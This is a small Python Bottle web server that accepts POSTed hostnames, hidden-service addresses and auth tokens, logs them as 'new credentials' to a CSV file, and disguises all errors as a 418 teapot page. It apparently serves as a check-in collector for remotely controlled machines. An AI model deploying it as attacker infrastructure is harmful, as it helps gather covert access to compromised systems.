import bottle


output_file = "services.csv"


@bottle.error(500)
@bottle.error(404)
@bottle.error(405)
def return_teapot(error=None):
    print("Hit teapot method.")
    status_message = "<h1>ERROR 418 - I am a teapot</h1>"
    status_message += "<br><p><i>And I am not the teapot you're looking for . . .</p>"
    return bottle.HTTPResponse(status=418, body=status_message)


@bottle.route("/", method="POST")
def get_message_content():
    post_data = bottle.request.body.read()
    print(post_data)
    try:
        hostname = bottle.request.forms.get("hostname")
        auth_token = bottle.request.forms.get("auth_token")
        hs_addr = bottle.request.forms.get("hs_addr")
        csv_string = f"{hostname},{hs_addr},{auth_token}"
        print(f"[+] Registering new credentials: {csv_string}")
        with open(output_file, "a") as outfile:
            outfile.write(f"{csv_string}\n")
    except Exception as e:
        print(f"[!] Error while handling post data: {e}")


bottle.run(host="0.0.0.0")